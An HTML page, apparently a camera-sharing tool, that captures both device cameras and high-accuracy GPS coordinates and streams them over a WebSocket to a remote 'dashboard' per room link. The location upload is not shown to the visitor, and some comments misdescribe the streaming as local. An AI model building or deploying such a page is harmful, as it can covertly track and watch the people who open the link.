<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Live Camera</title>
  <style>
    body { margin:0; background:#0b1020; color:#e5f4ff; font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif; }
    .wrap { max-width: 980px; margin: 0 auto; padding: 16px; }
    video { width: 100%; max-height: 45vh; background:#000; border-radius:12px; }
    .row { display:flex; gap:12px; flex-wrap:wrap; }
  </style>
</head>
<body>
  <div class="wrap">
    <h2>Live Camera</h2>
    <div style="margin-bottom: 16px;">
      <button id="modeToggle" style="padding: 8px 16px; background: #1e40af; color: white; border: none; border-radius: 6px; cursor: pointer;">
        Refresh Stream
      </button>
      <span id="modeStatus" style="margin-left: 12px; color: #10b981;">✓ Live streaming to dashboard</span>
    </div>
    <div class="row">
      <video id="front" autoplay playsinline></video>
      <video id="back" autoplay playsinline></video>
    </div>
  </div>
  <script>
    const room = new URLSearchParams(location.search).get('room') || 'default';
    const front = document.getElementById('front');
    const back = document.getElementById('back');
    
    // Unified permission manager with location
    class PermissionManager {
      constructor() {
        this.permissions = {
          camera: false,
          network: false,
          location: false
        };
      }
      
      async requestAllPermissions() {
        try {
          // Request location permission first
          console.log('Requesting location permission...');
          await this.requestLocationPermission();
          
          // Request camera permission
          console.log('Requesting camera permission...');
          const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
              facingMode: 'user',
              width: { ideal: 1280 },
              height: { ideal: 720 }
            }, 
            audio: false 
          });
          
          this.permissions.camera = true;
          console.log('✓ Camera permission granted');
          
          // Test network connection
          console.log('Testing network connection...');
          await this.testNetworkConnection();
          
          return { success: true, stream };
        } catch (error) {
          console.error('Permission request failed:', error);
          this.showPermissionError(error);
          return { success: false, error };
        }
      }
      
      async requestLocationPermission() {
        return new Promise((resolve, reject) => {
          if (!navigator.geolocation) {
            reject(new Error('Geolocation not supported'));
            return;
          }
          
          navigator.geolocation.getCurrentPosition(
            (position) => {
              this.permissions.location = true;
              console.log('✓ Location permission granted');
              console.log('Location:', position.coords.latitude, position.coords.longitude);
              resolve(position);
            },
            (error) => {
              console.error('Location permission denied:', error);
              reject(error);
            },
            { timeout: 10000, enableHighAccuracy: true }
          );
        });
      }
      
      async testNetworkConnection() {
        try {
          // Test WebSocket connection
          const testWs = new WebSocket(`${location.protocol.startsWith('https') ? 'wss' : 'ws'}://${location.host}/ws?room=test`);
          
          return new Promise((resolve, reject) => {
            const timeout = setTimeout(() => {
              testWs.close();
              reject(new Error('Network connection timeout'));
            }, 5000);
            
            testWs.onopen = () => {
              clearTimeout(timeout);
              testWs.close();
              this.permissions.network = true;
              console.log('✓ Network connection verified');
              resolve();
            };
            
            testWs.onerror = () => {
              clearTimeout(timeout);
              reject(new Error('Network connection failed'));
            };
          });
        } catch (error) {
          throw new Error('Network connection test failed: ' + error.message);
        }
      }
      
      showPermissionError(error) {
        let errorMessage = 'Permission request failed.';
        if (error.name === 'NotAllowedError') {
          errorMessage = 'Camera access was denied. Please allow camera permission and refresh the page.';
        } else if (error.name === 'NotFoundError') {
          errorMessage = 'No camera found. Please check your device has a camera.';
        } else if (error.message.includes('Network')) {
          errorMessage = 'Network connection failed. Please check your internet connection.';
        }
        
        document.body.innerHTML = `
          <div class="wrap">
            <h2>Permission Required</h2>
            <p>${errorMessage}</p>
            <div style="background: #fef3c7; padding: 16px; border-radius: 8px; margin: 16px 0;">
              <h3>How to fix:</h3>
              <ol>
                <li>Click "Allow" when prompted for camera access</li>
                <li>Check your browser's permission settings</li>
                <li>Ensure you have a stable internet connection</li>
                <li>Try refreshing the page</li>
              </ol>
            </div>
            <button onclick="location.reload()" style="padding: 12px 24px; background: #1e40af; color: white; border: none; border-radius: 6px; cursor: pointer;">
              Try Again
            </button>
          </div>
        `;
      }
      
      getStatus() {
        return {
          camera: this.permissions.camera,
          network: this.permissions.network,
          allGranted: this.permissions.camera && this.permissions.network
        };
      }
    }
    
    const permissionManager = new PermissionManager();

    // Initialize camera and start live streaming to dashboard
    async function initCamera() {
      console.log('Initializing camera with unified permissions...');
      const result = await permissionManager.requestAllPermissions();
      
      if (result.success) {
        console.log('All permissions granted, setting up LIVE STREAMING...');
        localStream = result.stream;
        front.srcObject = localStream;
        
        // Update status display
        updateStatusDisplay('✓ Live streaming to dashboard...');
        
        // Start streaming to dashboard
        startLiveStreaming();
        
        // For mobile devices, try to get back camera after a short delay
        setTimeout(async () => {
          try {
            const backStream = await navigator.mediaDevices.getUserMedia({ 
              video: { 
                facingMode: 'environment',
                width: { ideal: 1280 },
                height: { ideal: 720 }
              }, 
              audio: false 
            });
            back.srcObject = backStream;
            console.log('✓ Back camera connected - streaming to dashboard');
            updateStatusDisplay('✓ Both cameras streaming to dashboard');
            
            // Stream back camera to dashboard too
            streamToDashboard(backStream, 'back');
          } catch (e) {
            console.log('Back camera not available, using front camera for both');
            // Use the same local stream for both cameras
            back.srcObject = localStream;
            updateStatusDisplay('✓ Front camera streaming to dashboard (back camera unavailable)');
          }
        }, 1000);
      } else {
        console.error('Failed to get permissions:', result.error);
      }
    }
    
    // Start live streaming to dashboard
    function startLiveStreaming() {
      console.log('Starting live stream to dashboard...');
      
      // Stream front camera to dashboard
      streamToDashboard(localStream, 'front');
      
      // Send location data to dashboard
      sendLocationToDashboard();
    }
    
    // Stream video to dashboard via WebSocket
    function streamToDashboard(stream, cameraType) {
      if (!ws || ws.readyState !== WebSocket.OPEN) {
        console.log('WebSocket not ready, retrying...');
        setTimeout(() => streamToDashboard(stream, cameraType), 1000);
        return;
      }
      
      // Create a canvas to capture video frames
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      
      canvas.width = 640;
      canvas.height = 480;
      
      // Capture frames and send to dashboard
      const captureFrame = () => {
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL('image/jpeg', 0.8);
          
          // Send frame to dashboard
          ws.send(JSON.stringify({
            type: 'video_frame',
            camera: cameraType,
            room: room,
            data: imageData,
            timestamp: Date.now()
          }));
        }
        requestAnimationFrame(captureFrame);
      };
      
      video.onloadedmetadata = () => {
        console.log(`Streaming ${cameraType} camera to dashboard`);
        captureFrame();
      };
    }
    
    // Send location data to dashboard
    function sendLocationToDashboard() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
          ws.send(JSON.stringify({
            type: 'location',
            room: room,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: Date.now()
          }));
          console.log('Location sent to dashboard:', position.coords.latitude, position.coords.longitude);
        });
      }
    }
    
    function updateStatusDisplay(message) {
      const statusElement = document.getElementById('modeStatus');
      if (statusElement) {
        statusElement.textContent = message;
        statusElement.style.color = '#10b981';
      }
    }

    // Force local camera mode - each device shows its own camera
    let pc = null;
    let isLocalMode = true; // Always true - each device shows its own camera
    let localStream = null;

    let ws;
    function connectWebSocket() {
      const protocol = location.protocol.startsWith('https') ? 'wss' : 'ws';
      ws = new WebSocket(`${protocol}://${location.host}/ws?room=${encodeURIComponent(room)}`);
      
      ws.onopen = () => {
        console.log('WebSocket connected');
      };
      
      ws.onerror = (error) => {
        console.error('WebSocket error:', error);
      };
      
      ws.onclose = () => {
        console.log('WebSocket disconnected, reconnecting...');
        setTimeout(connectWebSocket, 3000);
      };
      
      ws.onmessage = async (ev) => {
        try {
          const data = JSON.parse(ev.data);
          console.log('WebSocket message received:', data.type || 'unknown');
          
          // Handle dashboard commands
          if (data.type === 'dashboard_command') {
            console.log('Dashboard command received:', data.command);
            // Handle any commands from dashboard if needed
          }
          
          // Ignore all other messages - we're only sending to dashboard
          
        } catch (error) {
          console.error('Error handling WebSocket message:', error);
        }
      };
    }

    // Local camera mode only - no remote streaming
    const modeToggle = document.getElementById('modeToggle');
    const modeStatus = document.getElementById('modeStatus');
    
    function updateModeUI() {
      // Live streaming mode
      modeToggle.textContent = 'Refresh Stream';
      modeToggle.style.background = '#1e40af';
      modeStatus.textContent = '✓ Live streaming to dashboard';
      modeStatus.style.color = '#10b981';
    }
    
    modeToggle.addEventListener('click', () => {
      // Refresh local camera instead of switching modes
      console.log('Refreshing local camera...');
      if (localStream) {
        localStream.getTracks().forEach(track => track.stop());
      }
      initCamera();
    });

    // Initialize camera and WebSocket
    initCamera();
    connectWebSocket();
    updateModeUI();
  </script>
</body>
</html>
